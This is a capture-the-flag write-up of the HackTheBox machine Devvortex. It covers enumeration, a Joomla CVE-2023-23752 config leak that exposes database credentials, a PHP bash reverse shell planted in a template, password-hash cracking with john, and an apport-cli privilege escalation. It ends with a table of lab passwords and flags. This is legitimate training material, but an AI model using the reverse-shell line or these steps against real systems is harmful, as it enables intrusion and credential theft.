---
aliases:
  - Devvortex
Date: 2024-02-23
Platform: HackTheBox
Category: Machine
Difficulty: Easy
tags:
  - "#Linux"
  - HackTheBox
  - Easy
  - Joomla
  - apport-cli
Status: 
IP: 10.10.11.242
---

# Resolution summary
- Text
- Text

## Improved skills
- Use mysql
- Reverse shell php
- Exploit CVE Joomla
- Exploit CVE apport-cli 2.20.11

## Used tools
- Nmap
- Gobuster
- Fuff

---

# Information Gathering

Scanned **ports** using nmap:
```bash
┌─[systemerror@parrot]─[~]
└──╼ $nmap -sC -sV 10.10.11.242 -A -T4 --min-rate=500                                                                                                                                     
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-23 19:26 CET
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DevVortex
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.11 seconds

```


----

# Enumerating web

I Fuzz the **subdomains** for devvortex.htb
```bash
┌─[systemerror@parrot]─[~]
└──╼ $ffuf -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

[Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 90ms]
    * FUZZ: dev

:: Progress: [4989/4989] :: Job [1/1] :: 961 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```


Scan directory for subdomains **dev.devvortex.htb**, and i found the **/administrator** directory
```bash
┌─[systemerror@parrot]─[~]
└──╼ $gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u dev.devvortex.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.devvortex.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2024/02/23 19:28:36 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]
/home                 (Status: 200) [Size: 23221]                                     
/media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/] 
/templates            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/templates/]
/modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]  
/plugins              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/plugins/]  
/includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/] 
/language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/] 
/components           (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/components/]
/api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]       
/cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]     
/libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/] 
/tmp                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/tmp/]       
/layouts              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/layouts/]   
/administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]
/cli                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cli/]    
```



---

# Exploitation
## Code Execution - CVE-2023-23752
In **/administrator** directory i found the Joomla login page

![[JoomlaLogin.png]]

Now it’s time to find if any information disclouser vulnerability in joomla. Here I found One CVE (  [CVE-2023-23752](https://vulncheck.com/blog/joomla-for-rce) ) shows that we can bypass this login page. Let’s follow the steps…..


```bash
curl -v http://10.9.49.205/api/index.php/v1/config/application?public=true
*   Trying 10.9.49.205:80...
* TCP_NODELAY set
* Connected to 10.9.49.205 (10.9.49.205) port 80 (#0)
> GET /api/index.php/v1/config/application?public=true HTTP/1.1
> Host: 10.9.49.205
> User-Agent: curl/7.68.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 20 Mar 2023 15:14:05 GMT
< Server: Apache/2.4.41 (Ubuntu)
< x-frame-options: SAMEORIGIN
< referrer-policy: strict-origin-when-cross-origin
< cross-origin-opener-policy: same-origin
< X-Powered-By: JoomlaAPI/1.0
< Expires: Wed, 17 Aug 2005 00:00:00 GMT
< Last-Modified: Mon, 20 Mar 2023 15:14:05 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Content-Length: 1983
< Content-Type: application/vnd.api+json; charset=utf-8
<
{"links":{"self":"http:\/\/10.9.49.205\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/10.9.49.205\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/10.9.49.205\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"vulncheck","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes":{"list_limit":20,"i* Connection #0 to host 10.9.49.205 left intact
d":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"root","id":224}},{"type":"application","id":"224","attributes":{"password":"labpass1","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla_db","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"xj3n0_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}
```

i use this vulnerable URL to take credentials 
```https
http://dev.devvortex/api/index.php/v1/config/application?public=true
```


TODO..photo


---

# Lateral Movement to user
## Local Enumeration
Now i use credential founded to access the login page and navigate under System> Administrator

![[Pasted image 20240225213725.png]]

Now i followed this files link & got all the template files which are actively using in this site. Here I found all the PHP codes & i can manipulate this in my way.

![[Pasted image 20240225213839.png]]

So, now i tried to get PHP reverse shell by executing my php_rev_shell command into this file (index.php-cueernt page).

```php
system('bash -c "bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1"');
```

![[Pasted image 20240225214239.png]]


---

# Privilege Escalation
## Local Enumeration
Once obtained reverse shell i make the shell stable with the follow python command

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

now i use the credentials founded previusly to take access on mysql

![[MysqlDataBases.png]]

In the database. i found a database named **joomla** & from this i extracted the user information on this machine.

```php
use joomla;  
show tables;  
select username,password from sd4fg_users;
```

![[Pasted image 20240225220159.png]]


Now its time to crack the hash using **john**, add the hash in one file

```bash
echo "$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12" > hash
```

and now crack them

```bash
┌─[systemerror@parrot]─[~]
└──╼ $john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)
1g 0:00:00:06 DONE (2024-02-23 23:14) 0.1543g/s 216.6p/s 216.6c/s 216.6C/s lacoste..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Connect to the machine suing **ssh** and the credential founded
```bash
ssh logan@10.10.11.242
```

search the user.txt its very easy..

if we check the list of user's privileges can see the current user is ability to use 
**apport-cli** with root privilege

```bash
sudo -l 
```

check the help of the **apport-cli** ( **apport-cli -h** ) and can see the -v for the version in this case is **2.20.11**

i found the [CVE-2023-1326](https://nvd.nist.gov/vuln/detail/CVE-2023-1326) to exploit follow this steps 
https://github.com/diego-tella/CVE-2023-1326-PoC 

Now search the root.txt flag 


---

# Trophy & Loot
## Credentials

| User | Password |
| ---- | ---- |
| lewis | P4ntherg0t1n5r3c0n## |
| logan | tequieromucho |

## Flags

| User         | Flag                             |
| ------------ | -------------------------------- |
| user.txt<br> | bfd9e6f1e71fa1c595d4aec9fabfed23 |
| root.txt     | 35bb10f15b04027fb129fea4c05ec7a6 |

